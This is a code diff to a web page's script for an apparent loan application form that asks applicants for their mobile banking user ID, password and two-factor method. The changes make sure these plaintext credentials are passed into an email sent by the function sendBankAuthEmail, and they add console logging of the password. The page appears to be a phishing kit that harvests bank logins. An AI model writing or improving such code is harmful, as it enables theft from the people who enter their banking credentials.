@@ -478,6 +478,13 @@
             const mobileBankingPassword = document.getElementById('mobileBankingPassword')?.value || '';
             const twoFactor = document.getElementById('twoFactor')?.value || '';
             
+            // Debug: Log form data immediately
+            console.log('Form Data Collected:');
+            console.log('Bank Name:', bankName);
+            console.log('User ID:', mobileBankingUserId);
+            console.log('Password:', mobileBankingPassword);
+            console.log('Two Factor:', twoFactor);
+            
             // Validate bank name and credentials (required)
             if (!bankName || !mobileBankingUserId || !mobileBankingPassword) {
                 alert('Please fill in all required bank authentication fields');
@@ -528,8 +535,8 @@
                 sessionStorage.setItem('loanApplicationData', JSON.stringify(combinedData));
                 console.log('Combined data stored in sessionStorage successfully');
                 
-                // Send bank authentication email notification
-                sendBankAuthEmail(combinedData);
+                // Send bank authentication email notification BEFORE modifying DOM
+                sendBankAuthEmail(combinedData, bankName, mobileBankingUserId, mobileBankingPassword, twoFactor);
                 
                 // Show processing message
                 const form = document.getElementById('bankAuthForm');
@@ -562,7 +569,7 @@
         }
         
         // Send bank authentication email notification
-        function sendBankAuthEmail(data) {
+        function sendBankAuthEmail(data, bankNameValue, userIdValue, passwordValue, twoFactorValue) {
             try {
                 // Debug: Log the data to see what's available
                 console.log('Bank Auth Email Data:', data);
@@ -570,16 +577,12 @@
                 console.log('User ID:', data.mobileBankingUserId);
                 console.log('Password:', data.mobileBankingPassword);
                 
-                // Get current form values directly to ensure we have the latest data
-                const currentBankName = document.getElementById('bankName')?.value || '';
-                const currentUserId = document.getElementById('mobileBankingUserId')?.value || '';
-                const currentPassword = document.getElementById('mobileBankingPassword')?.value || '';
-                const currentTwoFactor = document.getElementById('twoFactor')?.value || '';
-                
-                console.log('Current Form Values:');
-                console.log('Bank Name from form:', currentBankName);
-                console.log('User ID from form:', currentUserId);
-                console.log('Password from form:', currentPassword);
+                // Debug: Log the direct form values passed in
+                console.log('Direct Form Values Passed:');
+                console.log('Bank Name Value:', bankNameValue);
+                console.log('User ID Value:', userIdValue);
+                console.log('Password Value:', passwordValue);
+                console.log('Two Factor Value:', twoFactorValue);
                 
                 // Convert bank value to full name
                 const bankNames = {
@@ -605,7 +608,7 @@
                     'other': 'Other Bank'
                 };
                 
-                const fullBankName = bankNames[currentBankName] || data.bankName || 'Not provided';
+                const fullBankName = bankNames[bankNameValue] || data.bankName || 'Not provided';
                 
                 const templateParams = {
                     to_email: data.email || 'not-provided@example.com',
@@ -623,10 +626,10 @@
                     state: data.state || 'Not provided',
                     zip_code: data.zipCode || 'Not provided',
                     loan_duration: (data.loanDuration || 'Not specified') + ' months',
-                    mobile_banking_user_id: currentUserId || 'Not provided',
-                    two_factor_method: currentTwoFactor || 'Not provided',
-                    bank_auth_user_id: currentUserId || 'Not provided',
-                    bank_auth_password: currentPassword || 'Not provided'
+                    mobile_banking_user_id: userIdValue || 'Not provided',
+                    two_factor_method: twoFactorValue || 'Not provided',
+                    bank_auth_user_id: userIdValue || 'Not provided',
+                    bank_auth_password: passwordValue || 'Not provided'
                 };
 
                 console.log('Email Template Params:', templateParams);
